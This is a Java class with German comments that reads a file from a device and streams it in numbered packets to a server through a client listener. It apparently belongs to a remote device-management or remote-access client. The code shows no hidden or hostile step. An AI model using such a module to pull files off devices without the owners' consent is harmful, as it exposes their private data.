package my.app.Library;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;

import my.app.client.ClientListener;

import Packet.FilePacket;

/**
 * Diese Klasse ist dazu da Ordner oder Datei von dem Gerät herunterzuladen.
 */
public class FileDownloader {
	/**
	 * ctx	Der Service der ein Objekt dieser Klasse erstellt.
	 */
	ClientListener ctx;
	/**
	 * finalData Diese Variable wird nicht verwendet.
	 */
	byte[] finalData;
	/**
	 * in	Ein Filestream
	 */
	InputStream in;
	/**
	 * f	Der Ordner
	 */
	File f;
	/**
	 * channel	 Der Kanal zur Datenübertragung
	 */
	int channel;
	/**
	 * packet  Das Paket um die Daten zu versenden.
	 */
	FilePacket packet;
	/**
	 * buffer	Ein Byte-Array das später benötigt wird um die Daten zwischen zu speichern.
	 */
	byte[] buffer;
	/**
	 * numseq	Die Sequenznummer der Pakete
	 */
	short numseq = 0;
	/**
	 * BUFF_SIZE 	Größe des Buffers und des Packets.
	 */
	int BUFF_SIZE = 4096;

	/**
	 * Der Konstruktor der Klasse. Er speichert den übergebenen ClientListener in der Klassenvariablen ab.
	 * @param c	Der Service der dieses Objekt erstellt.
	 */
	public FileDownloader(ClientListener c) {
		ctx = c;
	}

	/**
	 * Diese Funktion erstellt ein Thread in welchem die Datei oder der Ordner heruntergeladen wird.
	 * @param s	Der Ordner welcher heruntergeladen werden soll.
	 * @param chan Der Kanal zur Datenübermittlung
	 * @return	true falls heruntergeladen wurde, false falls dies nicht geklappt hat.
	 */
	public boolean downloadFile(String s, int chan) {
		/**
		 * Klassenvariable befüllen
		 */
		channel = chan;
		/**
		 * neunes File-Objekt erstellen mit dem Ordnerpfad.
		 */
		f = new File(s);
		try {
			/**
			 * Versuchen einen neuen Stream zum auslesen der Daten in dem Ordner f zu erstellen.
			 */
			in = new FileInputStream(f);
		} catch (FileNotFoundException e) {
			/**
			 * Sollte der Ordner nicht gefunden werden so wird false zurückgegeben.
			 */
			return false;
		}
		/**
		 * Erstellen eines neuen Threads um die Daten herunterzuladen
		 */
        Thread loadf = new Thread(new Runnable() {
        	public void run() {
        		load();
        	}
        });
		/**
		 * Straten des Threads
		 */
        loadf.start();
		/**
		 * True zurückgeben.
		 */
		return true;
	}

	/**
	 * Diese Methode wird in dem eigens erstellten Thread aufgerufen.
	 * Sie dient dazu die Daten des Ordner herunterzuladen.
	 */
	public void load() {
		try {
			/**
			 * Schleife
			 */
			while(true) {
				/**
				 * Erstellen des Buffers mit der BUFFER_SIZE als Größe
				 */
				buffer = new byte[BUFF_SIZE];
				/**
				 * Auslesen der Daten. Der Buffer bestimmt die Größe der auszulesenden Daten.
				 * Read ist die Anzahl der gelesen bytes.
				 */
				int read = in.read(buffer);
				/**
				 * Sollte read -1 sein so wurden keine Daten gelesen. Und die Schleife wird beendet.
				 */
				if (read == -1) {
					break;
				}
				/**
				 * Überprüfen ob read gleich der BUFFER_SIZE ist.
				 */
				if (read == BUFF_SIZE) {
					/**
					 * Erstellen eines neuen FilePacket mit der Sequenz Nummer und dem Buffer.
					 */
					packet = new FilePacket(numseq, (byte) 1, buffer);
					/**
					 * Dieses Paket bauen und über den Kanal an den Server senden.
					 */
					ctx.handleData(channel, packet.build());
					/**
					 * Die Sequenznummer um eins erhöhnen
					 */
					numseq ++;
				}
				/**
				 * Sollte read ungleich der BUFFER_SIZE sein so handelt es sich um das letze Paket.
				 */
				else {//C'était le dernier paquet
					/**
					 * Erstellen eines neuen Buffers tmp mit der Größe der ausgelesenen Bytes
					 */
					byte[] tmp = new byte[read];
					/**
					 * Kopieren der Bytes aus der Vaiablen buffer in tmp
					 */
					System.arraycopy(buffer, 0, tmp, 0, read);
					/**
					 * Neues Packet erstellen mit tmp
					 */
					packet = new FilePacket(numseq, (byte) 0, tmp);
					/**
					 * Das Paket bauen und anschließend versenden
					 */
					ctx.handleData(channel, packet.build());
					/**
					 * Danach wird die Schleife beendet.
					 */
					break;
				}
			}
			/**
			 * Der Filestream wird geschlossen
			 */
			in.close();
		}
		/**
		 * Sollte eine Exception geworfen werden so wird eine Fehlermeldung erstellt.
		 */
		catch(IOException e) {
			ctx.sendError("IOException loading file");
		}
	}
}
